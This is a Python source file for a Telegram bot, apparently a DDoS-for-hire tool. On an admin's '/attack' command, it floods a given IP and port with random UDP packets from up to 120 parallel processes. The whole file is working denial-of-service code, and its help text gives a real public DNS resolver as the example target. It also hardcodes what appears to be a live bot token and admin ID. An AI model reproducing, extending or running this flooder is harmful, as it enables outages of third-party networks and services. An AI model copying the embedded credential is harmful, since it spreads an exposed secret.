import logging
import socket
import time
import random
import multiprocessing as mp
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== BOT CONFIG ====================
BOT_TOKEN = "7149714912:AAFDri0PhxEQoHtv3nW-YEq115PVeMVrLrI"
ADMIN_ID = 5879540185

active_attacks = {}
stop_flags = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 **5000 Threads Wala VPS Attack Bot** Ready (but smart limited)")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚔️ **Commands**\n\n"
        "`/attack <ip> <port> <duration> <threads>`\n"
        "Example: `/attack 8.8.8.8 53 60 5000`\n"
        "→ Bot automatically caps at 64 for best speed on 16 cores\n\n"
        "/stopattack\n/status",
        parse_mode='Markdown'
    )

def attack_worker(ip, port, duration, stop_event, worker_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)  # 8MB
        sock.setblocking(False)

        end_time = time.time() + duration
        packets = 0
        base = b"VPS_POWER_5000_" + str(worker_id).encode()

        while time.time() < end_time and not stop_event.is_set():
            try:
                size = random.randint(700, 1450)
                payload = base + random.randbytes(size - len(base))
                sock.sendto(payload[:size], (ip, port))
                packets += 1

                if packets % 2000 == 0:   # thoda back-pressure control
                    time.sleep(0.00005)
            except BlockingIOError:
                time.sleep(0.0003)
            except:
                break

        sock.close()
        return packets
    except:
        return 0

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    if len(context.args) < 4:
        await update.message.reply_text("Usage: `/attack <ip> <port> <duration_sec> <threads>`", parse_mode='Markdown')
        return

    ip = context.args[0]
    port = int(context.args[1])
    duration = int(context.args[2])
    requested_threads = int(context.args[3])

    # Smart capping for performance
    actual_processes = min(requested_threads, 64) if requested_threads <= 100 else min(requested_threads, 120)
    
    if requested_threads > 64:
        warning = f"\n⚠️ Requested {requested_threads} but using only {actual_processes} for max speed on 16 cores."
    else:
        warning = ""

    attack_id = f"{ip}:{port}_{int(time.time())}"
    stop_event = mp.Event()
    stop_flags[attack_id] = stop_event

    await update.message.reply_text(
        f"⚔️ **ATTACK STARTED**\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱ Duration: `{duration}s`\n"
        f"⚙ Processes: `{actual_processes}` (requested: {requested_threads}){warning}",
        parse_mode='Markdown'
    )

    pool = mp.Pool(processes=actual_processes)
    results = [pool.apply_async(attack_worker, (ip, port, duration, stop_event, i)) for i in range(actual_processes)]

    total_sent = 0
    for res in results:
        total_sent += res.get()

    pool.close()
    pool.join()

    await update.message.reply_text(
        f"✅ **Attack Finished**\n"
        f"Target: `{ip}:{port}`\n"
        f"Processes used: `{actual_processes}`\n"
        f"Approx packets sent: `{total_sent:,}`"
    )

async def stop_attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    for ev in stop_flags.values():
        ev.set()
    await update.message.reply_text("🛑 All attacks stopped.")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stopattack", stop_attack_cmd))

    print("🔥 5000 Threads Mode Bot Running on 16-core VPS!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
